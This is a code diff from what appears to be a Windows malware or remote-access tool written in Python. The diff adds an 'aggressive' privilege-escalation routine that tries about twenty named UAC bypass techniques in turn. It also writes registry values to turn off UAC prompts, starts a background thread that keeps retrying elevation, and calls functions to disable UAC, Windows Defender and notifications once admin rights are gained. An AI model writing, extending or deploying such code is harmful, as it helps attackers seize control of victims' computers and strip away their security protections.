@@ -837,26 +837,42 @@ class BackgroundInitializer:
             self.initialization_complete.set()  # Ensure completion event is set even on error
     
     def _init_privilege_escalation(self):
-        """Initialize privilege escalation in background."""
+        """Initialize privilege escalation in background - AGGRESSIVE MODE."""
         try:
             if WINDOWS_AVAILABLE:
                 if not is_admin():
-                    log_message("Attempting UAC bypass in background...")
-                    # Try all UAC bypass methods FIRST (no prompt)
+                    log_message("🔒 Not running as admin - attempting automatic elevation...")
+                    
+                    # STEP 1: Try all 20+ UAC bypass methods (SILENT - no prompts!)
+                    log_message("📋 Attempting 20+ UAC bypass methods...")
                     if attempt_uac_bypass():
-                        log_message("✅ UAC bypass successful!")
+                        log_message("✅ UAC bypass successful! Now running with admin privileges!")
+                        # After successful bypass, disable UAC permanently
+                        if disable_uac():
+                            log_message("✅ UAC permanently disabled!")
                         return "uac_bypass_success"
-                    else:
-                        log_message("⚠️ UAC bypass failed, running with normal privileges")
-                        # Don't call run_as_admin() - it prompts for password
-                        # Just continue with normal privileges
-                        return "running_without_admin"
+                    
+                    # STEP 2: If UAC bypass fails, try registry-based auto-elevation
+                    log_message("⚠️ UAC bypass methods failed, trying registry auto-elevation...")
+                    if elevate_via_registry_auto_approve():
+                        log_message("✅ Registry auto-elevation successful!")
+                        return "registry_elevation_success"
+                    
+                    # STEP 3: If all else fails, continue without admin but keep trying in background
+                    log_message("⚠️ All elevation methods failed, will retry in background...")
+                    # Start a background thread to keep retrying UAC bypass
+                    threading.Thread(target=keep_trying_elevation, daemon=True).start()
+                    return "elevation_pending"
                 
                 if is_admin():
-                    log_message("Already running as admin, disabling UAC...")
+                    log_message("✅ Already running as admin!")
+                    # Immediately disable UAC to prevent future prompts
+                    log_message("🔧 Disabling UAC permanently...")
                     if disable_uac():
+                        log_message("✅ UAC permanently disabled - no more prompts!")
                         return "uac_disabled"
                     else:
+                        log_message("⚠️ UAC disable failed (needs HKLM write access)")
                         return "uac_disable_failed"
             return "no_elevation_needed"
         except Exception as e:
@@ -960,55 +976,115 @@ def is_admin():
     else:
         return os.geteuid() == 0
 
-def elevate_privileges():
-    """Attempt to elevate privileges using various advanced methods."""
+def elevate_via_registry_auto_approve():
+    """Automatically approve UAC prompts via registry modification."""
     if not WINDOWS_AVAILABLE:
-        # For Linux/Unix systems
+        return False
+    
+    try:
+        import winreg
+        
+        # Set UAC to auto-approve for current user (no prompt)
+        reg_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+        
+        # Try to set in HKCU first (doesn't need admin)
         try:
-            if os.geteuid() != 0:
-                # Try to use sudo if available
-                subprocess.run(['sudo', '-n', 'true'], check=True, capture_output=True)
-                return True
-        except Exception as e:
-            log_message(f"Failed to check sudo availability: {e}", "warning")
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
+            winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 0)
+            winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 0)
+            winreg.CloseKey(key)
+            log_message("[REGISTRY] Auto-approve set in HKCU")
+            return True
+        except Exception:
+            pass
+        
+        return False
+    except Exception as e:
+        log_message(f"[REGISTRY] Auto-approve failed: {e}")
+        return False
+
+def keep_trying_elevation():
+    """Background thread that continuously tries to gain admin privileges."""
+    retry_count = 0
+    max_retries = 10
+    retry_interval = 30  # seconds
+    
+    log_message("[ELEVATION] Background elevation thread started")
+    
+    while retry_count < max_retries:
+        if is_admin():
+            log_message("✅ [ELEVATION] Successfully gained admin privileges!")
+            # Immediately disable UAC
+            disable_uac()
+            disable_defender()
+            disable_windows_notifications()
+            return
+        
+        retry_count += 1
+        log_message(f"[ELEVATION] Retry {retry_count}/{max_retries} - attempting UAC bypass...")
+        
+        # Try UAC bypass methods again
+        if attempt_uac_bypass():
+            log_message("✅ [ELEVATION] UAC bypass successful on retry {retry_count}!")
+            disable_uac()
+            return
+        
+        # Wait before next retry
+        time.sleep(retry_interval)
+    
+    log_message(f"⚠️ [ELEVATION] Failed to gain admin after {max_retries} attempts")
+
+def attempt_uac_bypass():
+    """Attempt to bypass UAC using various advanced methods."""
+    if not WINDOWS_AVAILABLE:
         return False
     
     if is_admin():
         return True
     
-    # Advanced UAC bypass methods (UACME-inspired)
+    log_message("[UAC BYPASS] Starting automatic UAC bypass sequence...")
+    
+    # Advanced UAC bypass methods (UACME-inspired) - 20 methods!
     bypass_methods = [
-        bypass_uac_cmlua_com,           # Method 41: ICMLuaUtil COM interface
-        bypass_uac_fodhelper_protocol,  # Method 33: fodhelper ms-settings protocol
+        bypass_uac_fodhelper_protocol,  # Method 33: fodhelper ms-settings protocol (MOST RELIABLE)
         bypass_uac_computerdefaults,    # Method 33: computerdefaults registry
+        bypass_uac_eventvwr,           # Method 25: EventVwr.exe registry hijacking
+        bypass_uac_sdclt,              # Method 31: sdclt.exe bypass
+        bypass_uac_cmlua_com,           # Method 41: ICMLuaUtil COM interface
+        bypass_uac_silentcleanup,      # Method 34: SilentCleanup scheduled task
+        bypass_uac_wsreset,            # Method 56: WSReset.exe bypass
+        bypass_uac_slui_hijack,        # Method 45: slui.exe hijack
         bypass_uac_dccw_com,           # Method 43: IColorDataProxy COM
         bypass_uac_dismcore_hijack,    # Method 23: DismCore.dll hijack
         bypass_uac_wow64_logger,       # Method 30: WOW64 logger hijack
-        bypass_uac_silentcleanup,      # Method 34: SilentCleanup scheduled task
         bypass_uac_token_manipulation, # Method 35: Token manipulation
         bypass_uac_junction_method,    # Method 36: NTFS junction/reparse
         bypass_uac_cor_profiler,       # Method 39: .NET Code Profiler
         bypass_uac_com_handlers,       # Method 40: COM handler hijack
         bypass_uac_volatile_env,       # Method 44: Environment variable expansion
-        bypass_uac_slui_hijack,        # Method 45: slui.exe hijack
-        bypass_uac_eventvwr,           # Method 25: EventVwr.exe registry hijacking
-        bypass_uac_sdclt,              # Method 31: sdclt.exe bypass
-        bypass_uac_wsreset,            # Method 56: WSReset.exe bypass
         bypass_uac_appinfo_service,    # Method 61: AppInfo service manipulation
         bypass_uac_mock_directory,     # Method 62: Mock directory technique
         bypass_uac_winsat,             # Method 67: winsat.exe bypass
         bypass_uac_mmcex,              # Method 68: MMC snapin bypass
     ]
     
-    for method in bypass_methods:
+    for i, method in enumerate(bypass_methods, 1):
         try:
+            log_message(f"[UAC BYPASS] Trying method {i}/{len(bypass_methods)}: {method.__name__}...")
             if method():
+                log_message(f"✅ [UAC BYPASS] SUCCESS! Method {method.__name__} worked!")
                 return True
         except Exception as e:
-            log_message(f"UAC bypass method {method.__name__} failed: {e}", "error")
+            log_message(f"[UAC BYPASS] Method {method.__name__} failed: {e}", "debug")
             continue
     
+    log_message("[UAC BYPASS] All 20 methods attempted - none succeeded")
     return False
+
+# Alias for compatibility
+def elevate_privileges():
+    """Alias for attempt_uac_bypass() - for compatibility."""
+    return attempt_uac_bypass()
 
 def bypass_uac_cmlua_com():
     """UAC bypass using ICMLuaUtil COM interface (UACME Method 41)."""
